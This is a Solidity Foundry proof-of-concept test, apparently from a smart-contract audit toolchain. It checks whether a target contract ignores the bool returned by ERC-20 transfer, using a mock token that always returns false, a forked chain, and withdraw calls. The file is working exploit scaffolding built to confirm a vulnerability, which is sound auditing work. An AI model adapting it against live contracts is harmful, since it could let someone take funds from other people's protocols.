// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked ERC-20 bool (non-standard token)
/// @notice Detector: erc20-unchecked. The target calls token.transfer()
///         and ignores the bool. Some tokens (USDT-style) return FALSE
///         instead of reverting on failure -- the target then credits a
///         transfer that never happened.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Uses a mock token that always returns
///      false. TODO: adapt setToken() / the token-transfer flow to the
///      target, and follow up by checking the target's accounting.

contract MockFalseToken {
    string public constant name = "MockFalse";
    string public constant symbol = "FALSE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address, uint256) external pure returns (bool) {
        return false; // transfer "fails" but does not revert
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        MockFalseToken mock = new MockFalseToken();

        // Point the target at the false-returning token.
        // TODO: adapt to the target's real token setter (or deploy the
        // target's flow against a token that returns false on this fork).
        (bool setOk,) = target.call(
            abi.encodeWithSignature("setToken(address)", address(mock))
        );
        require(setOk, "setToken(address) failed -- adapt to the target's token setter");

        // Trigger the target's token-transfer flow.
        // TODO: adapt to the real flow (withdraw / claim / redeem).
        (bool ok,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 100 ether));
        console.log("target flow completed despite token returning false:", ok);
        // A correct target reverts on a false return; a vulnerable one
        // completes as if the transfer succeeded.
        assertTrue(ok, "exploit did not reproduce: target checked the bool");
    }
}
